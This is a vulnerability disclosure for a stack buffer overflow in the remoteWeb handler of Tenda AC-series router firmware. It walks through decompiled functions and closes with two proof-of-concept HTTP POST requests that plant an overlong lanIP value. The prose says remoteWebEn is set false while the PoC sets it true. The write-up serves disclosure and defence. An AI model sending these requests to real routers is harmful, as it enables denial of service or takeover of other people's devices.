# Tenda Router Vulnerability

This vulnerability exists in  module `remoteWeb` of  `/goform/setSysTools`  and affects multiple devices of the Tenda Router. Equipment models include AC5, AC6, AC7, AC8, AC10, AC11. It affects several firmware versions, including the latest version number published on the official website. And it is RTOS system.

[https://www.tenda.com.cn/searchdown/AC.html](https://www.tenda.com.cn/searchdown/AC.html)

## Vulnerability description

（The pseudocode for the example is the last version of AC6）

There is a stack buffer overflow vulnerability in the `sub_80073B88` function.(page  /goform/getSysTools in module remoteWeb)
![pic/Untitled.png](pic/Untitled.png)


In this function, it will use `nvram_get("lan_ipaddr");` to get an NVRAM variable, which is then placed in a `V2` variable. After that ,it will use `Strcpy (v6, v2);` to put V2 on V6 without any security check.

The  `lan_ipaddr`  NVRAM variable can be controlled in the `sub_8007DB28` function.
![pic/Untitled1.png](pic/Untitled1.png)


You can see that it's assigned by `lanIP_buf`.

![pic/Untitled2.png](pic/Untitled2.png)

Initially `lanIP_buf` is what we inputed, so the `lanIP_buf` NVRAM variable becomes manageable.

![pic/Untitled3.png](pic/Untitled3.png)

If `strcmp(v47,lanip_buf)` does not return a value of 0 and `sub_80086470` returns a value of 0, then the NVRAM variable `lan_ipaddr` will be set to the `lanip_buf` we inputed.

The `lanip_buf` is the input vector, while v47 is a fixed string, so it is easy to make them different so that the `strcmp` function does not return zero.

![pic/Untitled4.png](pic/Untitled4.png)

In function `sub_80086470`  ,if we want it returns zero, we must make `strlen(a1)` is bigger than 7, it's easy to make.And the return value of function `sub_801B8EA4` must be zero.

In function `sub_801B8EA4` , it will do IP legitimacy check .  But it will not check the length. 

Experimentally,  we can get a very long string like 192.168.1.0000000000000000000000000000000000000000000000000000000000000001 to pass the check .And after the check, function `sub_801B8EA4` will give v4 a 4-bytes ip address . If a1 can pass the check, v2 will be zero, but a1 will not get changed and will be set in nvram variable `lan_ipaddr`. So we can make `lan_ipaddr` variable in nvram is a very long string.

At this point, the NVRAM variable `lan_ipaddr` has been successfully controlled, and then we need to determine how to jump to `sub_80073B88` to trigger the vulnerability.

By looking at the xrefs to  the function `sub_80073B88` ，you can find such a chain of program calls.

`cgi_lib_set_remote_info` → `sub_80073D0C`→`sub_80073B88`

![pic/Untitled5.png](pic/Untitled5.png)

![pic/Untitled6.png](pic/Untitled6.png)

For the process `LABEL_14` in the `cgi_lib_set_remote_info` function, simply make the `remoteWebEn` input false and set a remote administration Web port that is not its own. For example, 9999.

![pic/Untitled7.png](pic/Untitled7.png)
![pic/Untitled8.png](pic/Untitled8.png)


Thus, by first setting `lan_ipaddr` in the lanCfg module of  `/goform/setSysTools`, and then setting `remoteWebEn` and `remoteWebPort` in the remoteWeb module of `/goform/setsystools`, An attacker can easily use elaborate overflow data to perform a denial-of-service attack or remote code execution.

## POC

```
POST /goform/setSysTools HTTP/1.1
Host: 192.168.0.1
Content-Length: 500
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

module1=lanCfg&lanIP=192.168.0.00000000000000000000000000000000000000000000000000000000000000000000001&lanMask=255.255.255.0&dhcpEn=true&lanDhcpStartIP=192.168.0.100&lanDhcpEndIP=192.168.0.200&lanDns1=192.168.0.1&lanDns2=
```

```
POST /goform/setSysTools HTTP/1.1
Host: 192.168.0.1
Content-Length: 500
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

module1=remoteWeb&remoteWebEn=true&remoteWebType=any&remoteWebIP=&remoteWebPort=9999
```